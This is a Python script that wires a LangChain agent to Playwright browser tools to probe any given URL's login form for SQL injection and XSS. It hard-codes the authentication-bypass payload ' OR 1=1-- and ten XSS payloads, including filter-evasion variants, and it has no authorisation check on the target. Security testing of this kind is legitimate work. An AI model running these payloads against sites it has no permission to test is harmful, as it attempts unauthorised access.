#!/usr/bin/env python3
"""
SQL Injection Vulnerability Testing Agent using LangChain + Playwright

Prerequisites:
    pip install -r requirements.txt
    playwright install

Usage:
    python agent_with_playwright.py [TARGET_URL]

This script creates a LangChain agent with Playwright tools to test for SQL injection
vulnerabilities on login pages.
"""

# MUST set these environment variables BEFORE any LangChain imports
import os
from dotenv import load_dotenv
load_dotenv()
os.environ["LANGCHAIN_TRACING_V2"] = "false"
os.environ["LANGCHAIN_ENDPOINT"] = ""
os.environ["LANGCHAIN_API_KEY"] = ""
os.environ["LANGSMITH_API_KEY"] = ""

import asyncio
import sys
from typing import Dict, Any, Optional, Type
import json
import traceback

# Modern LangChain imports
from langchain.tools import BaseTool
from langchain.agents import create_react_agent, AgentExecutor
from langchain_openai import ChatOpenAI
from langchain.prompts import PromptTemplate
from langchain import hub
from pydantic import BaseModel, Field

# Import our Playwright interface
from bot.playwright_interface import WebSession, SessionConfig, ContentFormat

# Global session instance for tools to share
current_session: Optional[WebSession] = None


class InputTextBoxInput(BaseModel):
    """Input for InputTextBoxTool"""
    query: str = Field(description="Selector and text in format 'selector,text' (e.g., \"input[name='username'],admin\")")


class InputTextBoxTool(BaseTool):
    """Tool for inputting text into form fields"""
    name: str = "input_textbox"
    description: str = """Use this to enter text into any input field on the webpage.
    Input should be: selector,text (e.g., "input[name='username'],admin")"""
    args_schema: Type[BaseModel] = InputTextBoxInput
    
    def _run(self, query: str) -> str:
        """Synchronous version - not used"""
        return "Error: Use async version"
    
    async def _arun(self, query: str) -> str:
        """Execute the tool asynchronously"""
        print(f"Inputting text with query: {query}")
        try:
            if not query or query.lower() in ['none', 'null', '']:
                return "Error: Input required in format 'selector,text'"
            
            # More robust parsing to handle quotes and commas in text
            if ',' not in query:
                return "Error: Input should be 'selector,text'"
            
            # Split only on the first comma to handle commas in text
            selector, text = query.split(',', 1)
            selector = selector.strip().strip('"').strip("'")
            text = text.strip().strip('"').strip("'")
            
            if not current_session:
                return "Error: Session not initialized"
            
            # Clear the field first, then fill it
            await current_session.page.fill(selector, "")
            await current_session.fill_input(selector, text)
            
            # Wait a moment for any dynamic validation
            await asyncio.sleep(0.5)
            
            return f"Successfully typed '{text}' into element with selector '{selector}'"
        except Exception as e:
            return f"Error typing into textbox: {str(e)}\n{traceback.format_exc()}"


class ClickButtonInput(BaseModel):
    """Input for ClickButtonTool"""
    query: str = Field(description="CSS selector for the button to click (e.g., \"input[type='submit']\")")


class ClickButtonTool(BaseTool):
    """Tool for clicking buttons or clickable elements"""
    name: str = "click_button"
    description: str = """Use this to click buttons, submit forms, or click any clickable element.
    Input should be the CSS selector (e.g., "input[type='submit']")"""
    args_schema: Type[BaseModel] = ClickButtonInput
    
    def _run(self, query: str) -> str:
        """Synchronous version - not used"""
        return "Error: Use async version"
    
    async def _arun(self, query: str) -> str:
        """Execute the tool asynchronously"""
        print(f"Clicking button with query: {query}")
        try:
            if not query or query.lower() in ['none', 'null', '']:
                return "Error: CSS selector required"
            
            selector = query.strip().strip('"').strip("'")
            if not current_session:
                return "Error: Session not initialized"
            
            # Store current URL to detect navigation
            current_url = current_session.page.url
            
            # Click the element
            await current_session.click(selector)
            
            # Wait for potential navigation or page changes
            try:
                # Wait up to 3 seconds for URL change or network idle
                await asyncio.wait_for(
                    current_session.page.wait_for_function(
                        f"window.location.href !== '{current_url}'"
                    ), 
                    timeout=3.0
                )
                print("Page navigation detected")
            except asyncio.TimeoutError:
                print("No navigation detected, waiting for network idle")
                try:
                    await current_session.wait_for_network_idle(timeout=2000)
                except:
                    # If network idle fails, just wait a moment
                    await asyncio.sleep(1)
            
            new_url = current_session.page.url
            if new_url != current_url:
                return f"Successfully clicked element '{selector}' - navigated from {current_url} to {new_url}"
            else:
                return f"Successfully clicked element '{selector}' - no navigation detected"
                
        except Exception as e:
            return f"Error clicking button: {str(e)}\n{traceback.format_exc()}"


class ScrapePageInput(BaseModel):
    """Input for ScrapePageTool"""
    query: str = Field(default="scrape", description="Optional query (use 'scrape' or leave empty)")


class ScrapePageTool(BaseTool):
    """Tool for scraping the current page content"""
    name: str = "scrape_page"
    description: str = """Use this to get the current page content, including text and form structure.
    Input: just use 'scrape' or any text (the actual input doesn't matter)"""
    args_schema: Type[BaseModel] = ScrapePageInput
    
    def _run(self, query: str = "scrape") -> str:
        """Synchronous version - not used"""
        return "Error: Use async version"
    
    async def _arun(self, query: str = "scrape") -> str:
        """Execute the tool asynchronously"""
        print(f"Scraping page with query: {query}")
        try:
            if not current_session:
                return "Error: Session not initialized"
            
            print("Getting text content...")
            # Get text content for better readability by the LLM
            try:
                content = await current_session.get_content(format=ContentFormat.TEXT)
            except Exception as e:
                print(f"Text content retrieval failed: {e}")
                content = "Text content retrieval failed"
            
            print("Getting HTML content...")
            # Also get some HTML structure for form detection
            try:
                html_content = await current_session.get_content(format=ContentFormat.HTML)
            except Exception as e:
                print(f"HTML content retrieval failed: {e}")
                html_content = "<html><body>HTML retrieval failed</body></html>"
            
            print("Parsing HTML with BeautifulSoup...")
            # Extract form information
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(html_content, 'html.parser')
            forms = soup.find_all('form')
            inputs = soup.find_all('input')
            buttons = soup.find_all(['button', 'input[type="submit"]'])
            
            print(f"Found {len(forms)} forms, {len(inputs)} inputs, {len(buttons)} buttons")
            
            form_info = []
            for i, form in enumerate(forms):
                form_inputs = form.find_all('input')
                form_info.append(f"Form {i+1}: {len(form_inputs)} inputs")
                print(f"Processing form {i+1} with {len(form_inputs)} inputs")
                for inp in form_inputs:
                    inp_type = inp.get('type', 'text')
                    inp_name = inp.get('name', 'unnamed')
                    inp_id = inp.get('id', '')
                    
                    # Handle submit buttons specially
                    if inp_type == 'submit':
                        if inp_id:
                            selector = f"#{inp_id}"
                        else:
                            selector = "input[type='submit']"
                        form_info.append(f"  - {inp_type} input: {inp_name} (selector: {selector})")
                    else:
                        # Regular inputs
                        if inp_id:
                            selector = f"#{inp_id}"
                        elif inp_name != 'unnamed':
                            selector = f"input[name='{inp_name}']"
                        else:
                            selector = f"input[type='{inp_type}']"
                        form_info.append(f"  - {inp_type} input: {inp_name} (selector: {selector})")
            
            print("Processing buttons...")
            button_info = []
            # Find all button-like elements more comprehensively
            all_buttons = soup.find_all(['button']) + soup.find_all('input', type='submit')
            for btn in all_buttons:
                if btn.name == 'button':
                    btn_text = btn.get_text(strip=True)
                    btn_id = btn.get('id', '')
                    selector = f"#{btn_id}" if btn_id else f"button:has-text('{btn_text}')"
                else:  # input[type="submit"]
                    btn_text = btn.get('value', 'Submit')
                    btn_id = btn.get('id', '')
                    selector = f"#{btn_id}" if btn_id else "input[type='submit']"
                button_info.append(f"Button: '{btn_text}' (selector: {selector})")
                print(f"Found button: {btn_text}")
            
            print("Assembling final result...")
            result = f"=== PAGE CONTENT ===\n{content[:1000]}..."
            if form_info:
                result += f"\n\n=== FORMS DETECTED ===\n" + "\n".join(form_info)
            if button_info:
                result += f"\n\n=== BUTTONS DETECTED ===\n" + "\n".join(button_info)
            
            print("Scraping completed successfully")
            return result
        except Exception as e:
            print(f"Error during scraping: {str(e)}")
            return f"Error scraping page: {str(e)}\n{traceback.format_exc()}"


# Add a new tool for testing multiple SQL injection payloads
class SqlInjectionTestInput(BaseModel):
    """Input for SqlInjectionTestTool"""
    query: str = Field(description="Username and password selectors (e.g., '#username,#password')")


class SqlInjectionTestTool(BaseTool):
    """Tool for systematic SQL injection testing"""
    name: str = "sql_injection_test"
    description: str = """Use this to test SQL injection with admin username and ' OR 1=1-- password.
    Input should be: username_selector,password_selector (e.g., "#username,#password")"""
    args_schema: Type[BaseModel] = SqlInjectionTestInput
    
    def _run(self, query: str) -> str:
        return "Error: Use async version"
    
    async def _arun(self, query: str) -> str:
        """Execute SQL injection testing with admin/' OR 1=1--"""
        print(f"Starting SQL injection test with query: {query}")
        try:
            if not query or ',' not in query:
                return "Error: Input should be 'username_selector,password_selector'"
            
            username_selector, password_selector = query.split(',', 1)
            username_selector = username_selector.strip()
            password_selector = password_selector.strip()
            
            if not current_session:
                return "Error: Session not initialized"
            
            # Single SQL injection payload to test
            username = "admin"
            password_payload = "' OR 1=1--"
            
            print(f"Testing with username: {username} and password: {password_payload}")
            
            try:
                # Store original URL
                original_url = current_session.page.url
                
                # Clear and fill username
                await current_session.page.fill(username_selector, "")
                await current_session.fill_input(username_selector, username)
                await asyncio.sleep(0.3)
                
                # Clear and fill password with payload
                await current_session.page.fill(password_selector, "")
                await current_session.fill_input(password_selector, password_payload)
                await asyncio.sleep(0.3)
                
                # Submit form (try different submit methods)
                current_url = current_session.page.url
                
                try:
                    # Try clicking submit button
                    await current_session.click("input[type='submit']")
                except:
                    try:
                        # Alternative: try button element
                        await current_session.click("button[type='submit']")
                    except:
                        try:
                            # Last resort: press Enter on password field
                            await current_session.page.press(password_selector, "Enter")
                        except:
                            return "Could not submit form - no submit button found"
                
                # Wait for response
                try:
                    await asyncio.wait_for(
                        current_session.page.wait_for_function(
                            f"window.location.href !== '{current_url}' || document.body.textContent.includes('Welcome') || document.body.textContent.includes('Dashboard') || document.body.textContent.includes('successful')"
                        ), 
                        timeout=3.0
                    )
                except asyncio.TimeoutError:
                    pass
                
                # Check result
                new_url = current_session.page.url
                page_content = await current_session.get_content(format=ContentFormat.TEXT)
                
                # Check for success indicators
                success_indicators = [
                    'welcome', 'dashboard', 'successful', 'logged in', 
                    'authentication successful', 'home', 'profile', 'logout'
                ]
                
                page_lower = page_content.lower()
                has_success_indicator = any(indicator in page_lower for indicator in success_indicators)
                
                if new_url != current_url:
                    return f"🚨 SQL INJECTION SUCCESSFUL: Username 'admin' with password '" + password_payload + f"' caused navigation from {current_url} to {new_url}"
                elif has_success_indicator:
                    return f"🚨 SQL INJECTION SUCCESSFUL: Username 'admin' with password '" + password_payload + "' - success indicators detected in page content"
                else:
                    return f"SQL injection failed: Username 'admin' with password '" + password_payload + "' - no success indicators detected"
                
            except Exception as e:
                return f"Error during SQL injection test: {str(e)}"
            
        except Exception as e:
            return f"Error in SQL injection testing: {str(e)}\n{traceback.format_exc()}"


# Add XSS testing tool after SqlInjectionTestTool
class XssTestInput(BaseModel):
    """Input for XssTestTool"""
    query: str = Field(description="Target selector for input field (e.g., '#search-input' or 'input[name=\"search\"]')")


class XssTestTool(BaseTool):
    """Tool for systematic XSS vulnerability testing"""
    name: str = "xss_test"
    description: str = """Use this to test for XSS vulnerabilities in input fields.
    Input should be: target_selector (e.g., "#search-input")"""
    args_schema: Type[BaseModel] = XssTestInput
    
    def _run(self, query: str) -> str:
        return "Error: Use async version"
    
    async def _arun(self, query: str) -> str:
        """Execute XSS testing with various payloads"""
        print(f"Starting XSS test with query: {query}")
        try:
            if not query or query.lower() in ['none', 'null', '']:
                return "Error: Target selector required"
            
            selector = query.strip()
            
            if not current_session:
                return "Error: Session not initialized"
            
            # XSS payloads to test
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "\"><script>alert('XSS')</script>",
                "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
                "<SCRIPT>alert('XSS')</SCRIPT>",
                "%3Cscript%3Ealert('XSS')%3C/script%3E"
            ]
            
            vulnerabilities_found = []
            
            for i, payload in enumerate(xss_payloads):
                print(f"Testing XSS payload {i+1}/{len(xss_payloads)}: {payload[:50]}...")
                
                try:
                    # Store original URL and content
                    original_url = current_session.page.url
                    
                    # Clear and fill input with XSS payload
                    await current_session.page.fill(selector, "")
                    await current_session.fill_input(selector, payload)
                    await asyncio.sleep(0.5)
                    
                    # Try to trigger the input (submit, enter, or trigger search)
                    try:
                        # First try pressing Enter
                        await current_session.page.press(selector, "Enter")
                        await asyncio.sleep(1)
                    except:
                        try:
                            # Try clicking a submit button nearby
                            await current_session.click("button[type='submit']")
                            await asyncio.sleep(1)
                        except:
                            try:
                                # Try clicking any button near the input
                                await current_session.click("button")
                                await asyncio.sleep(1)
                            except:
                                # Just wait for any auto-processing
                                await asyncio.sleep(1)
                    
                    # Check for XSS execution indicators
                    page_content = await current_session.get_content(format=ContentFormat.HTML)
                    page_text = await current_session.get_content(format=ContentFormat.TEXT)
                    
                    # Check if payload is reflected in the page
                    payload_reflected = payload.lower() in page_content.lower()
                    
                    # Check for potential script execution
                    has_script_tags = "<script>" in page_content.lower() and "alert" in page_content.lower()
                    
                    # Check for unencoded special characters
                    dangerous_chars = ["<", ">", "\"", "'"]
                    unencoded_chars = [char for char in dangerous_chars if payload.count(char) > 0 and page_content.count(char) >= payload.count(char)]
                    
                    # Evaluate potential vulnerability
                    if payload_reflected and (has_script_tags or len(unencoded_chars) > 0):
                        severity = "HIGH" if has_script_tags else "MEDIUM"
                        vulnerabilities_found.append({
                            "payload": payload,
                            "severity": severity,
                            "reflected": payload_reflected,
                            "unencoded_chars": unencoded_chars,
                            "has_script_tags": has_script_tags
                        })
                        print(f"🚨 Potential XSS vulnerability found with payload: {payload}")
                    
                except Exception as e:
                    print(f"Error testing payload '{payload}': {str(e)}")
                    continue
            
            # Compile results
            if vulnerabilities_found:
                result = f"🚨 XSS VULNERABILITIES DETECTED! Found {len(vulnerabilities_found)} potential issues:\n\n"
                for vuln in vulnerabilities_found:
                    result += f"- Payload: {vuln['payload']}\n"
                    result += f"  Severity: {vuln['severity']}\n"
                    result += f"  Payload reflected: {vuln['reflected']}\n"
                    if vuln['unencoded_chars']:
                        result += f"  Unencoded characters: {', '.join(vuln['unencoded_chars'])}\n"
                    result += "\n"
                
                result += "RECOMMENDATION: Input validation and output encoding should be implemented to prevent XSS attacks."
                return result
            else:
                return f"XSS testing completed on selector '{selector}'. No obvious vulnerabilities detected. Tested {len(xss_payloads)} payloads."
                
        except Exception as e:
            return f"Error in XSS testing: {str(e)}\n{traceback.format_exc()}"


def create_vulnerability_agent() -> AgentExecutor:
    """Create a LangChain agent with Playwright tools for vulnerability testing"""
    
    # Initialize OpenAI LLM
    llm = ChatOpenAI(
        model="gpt-4.1-mini",
        temperature=0,
        openai_api_key=os.getenv("OPENAI_API_KEY")
    )
    
    # Create tools
    tools = [
        InputTextBoxTool(),
        ClickButtonTool(),
        ScrapePageTool(),
        SqlInjectionTestTool(),
        XssTestTool()  # NEW XSS testing tool
    ]
    
    # Use a custom prompt that handles tool inputs better and ensures JSON output
    prompt = PromptTemplate.from_template("""You are a web security expert with access to browser automation tools.

Available tools:
{tools}

Use the following format:

Question: the input question you must answer
Thought: you should always think about what to do
Action: the action to take, should be one of [{tool_names}]
Action Input: the input to the action (always provide a string, never use None or null)
Observation: the result of the action
... (this Thought/Action/Action Input/Observation can repeat N times)
Thought: I now know the final answer
Final Answer: ALWAYS provide your final answer as a JSON array of vulnerability objects. Each vulnerability object must have exactly these fields: "severity" (string: "HIGH", "MEDIUM", or "LOW"), "type" (string: vulnerability type like "SQL Injection" or "XSS"), "title" (string: brief title), "description" (string: detailed description). If no vulnerabilities are found, return an empty array []. Example format:
[
  {{
    "severity": "HIGH",
    "type": "SQL Injection",
    "title": "Authentication Bypass via SQL Injection",
    "description": "The login form is vulnerable to SQL injection attacks. Using the payload ' OR 1=1-- in the password field successfully bypassed authentication."
  }},
  {{
    "severity": "MEDIUM",
    "type": "XSS",
    "title": "Reflected Cross-Site Scripting",
    "description": "The search input field reflects user input without proper encoding, allowing script execution."
  }}
]

IMPORTANT: 
- For scrape_page tool, always use "scrape" as Action Input
- For input_textbox tool, use format "selector,text" as Action Input (no quotes around the entire string)
- For click_button tool, use the CSS selector as Action Input
- For sql_injection_test tool, use format "username_selector,password_selector" as Action Input
- For xss_test tool, use the CSS selector of the input field as Action Input
- Never use None, null, or empty values as Action Input
- Your Final Answer MUST be valid JSON array format, nothing else

Begin!

Question: {input}
Thought:{agent_scratchpad}""")
    
    # Create the agent using modern pattern
    agent = create_react_agent(llm, tools, prompt)
    
    # Create executor with better error handling
    agent_executor = AgentExecutor(
        agent=agent,
        tools=tools,
        verbose=True,
        max_iterations=20,
        handle_parsing_errors=True,
        return_intermediate_steps=True
    )
    
    return agent_executor


async def run_vulnerability_test(target_url: str) -> Dict[str, Any]:
    """
    Run vulnerability testing agent and return results.
    This function can be called from other modules.
    """
    global current_session
    
    results = {
        "success": False,
        "agent_output": "",
        "intermediate_steps": [],
        "vulnerabilities_detected": False,
        "error": None
    }
    
    try:
        print(f"🌐 Testing {target_url}...")
        config = SessionConfig(headless=True, timeout=15000)
        
        async with WebSession(target_url, config) as session:
            current_session = session
            
            # Create and run the agent
            agent = create_vulnerability_agent()
            
            # Initial prompt for the agent
            initial_prompt = f"""
            You are a web security expert testing the login page at {target_url} for vulnerabilities.
            
            You have access to five tools:
            1. scrape_page: Get current page content and detect forms/inputs (Action Input: "scrape")
            2. input_textbox: Enter text into input fields (Action Input: "selector,text")
            3. click_button: Click buttons or submit forms (Action Input: "selector")
            4. sql_injection_test: Systematically test multiple SQL injection payloads (Action Input: "username_selector,password_selector")
            5. xss_test: Systematically test for XSS vulnerabilities in input fields (Action Input: "selector")
            
            IMPORTANT: Always provide proper Action Input strings - never use None, null, or empty values.
            
            Please follow these steps systematically:
            1. Use scrape_page with Action Input "scrape" to understand the page structure
            2. Identify form fields (username/password inputs and other input fields) and their selectors
            3. Use xss_test with Action Input "selector" to test for XSS vulnerabilities in ALL input fields first
            4. Use sql_injection_test with Action Input "username_selector,password_selector" to test SQL injection on login form
            5. If sql_injection_test doesn't work, try manual testing:
               - Using input_textbox with Action Input "selector,admin" to enter username
               - Using input_textbox with Action Input "selector,' OR 1=1--" to enter malicious password
               - Using click_button to submit the form
            6. Use scrape_page with Action Input "scrape" again to check if login was successful
            7. Look for signs of successful login (welcome messages, dashboard, different URL, etc.)
            8. Report whether XSS or SQL injection vulnerabilities were detected
            
            Begin your assessment now.
            """
            
            print("🔍 Running vulnerability assessment...")
            
            # Run the agent asynchronously
            result = await agent.ainvoke({"input": initial_prompt})
            
            results["success"] = True
            results["agent_output"] = result.get("output", "")
            results["intermediate_steps"] = result.get("intermediate_steps", [])
            
            # Check for vulnerability indicators
            agent_output = results["agent_output"].lower()
            results["vulnerabilities_detected"] = any(indicator in agent_output for indicator in [
                "sql injection", "vulnerability found", "successful", "🚨", 
                "bypass", "authentication bypassed", "dashboard", "welcome"
            ])
            
    except Exception as e:
        results["error"] = str(e)
        print(f"❌ Error during assessment: {str(e)}")
    
    return results


if __name__ == "__main__":
    # Check for required environment variables
    if not os.getenv("OPENAI_API_KEY"):
        print("❌ Error: OPENAI_API_KEY environment variable is required")
        print("Please set it with: export OPENAI_API_KEY='your-api-key'")
        sys.exit(1)
    
    # Run the async main function
    if len(sys.argv) < 2:
        print("❌ Error: Target URL required")
        print("Usage: python agent_with_playwright.py <target_url>")
        sys.exit(1)
        
    target_url = sys.argv[1]
    asyncio.run(run_vulnerability_test(target_url))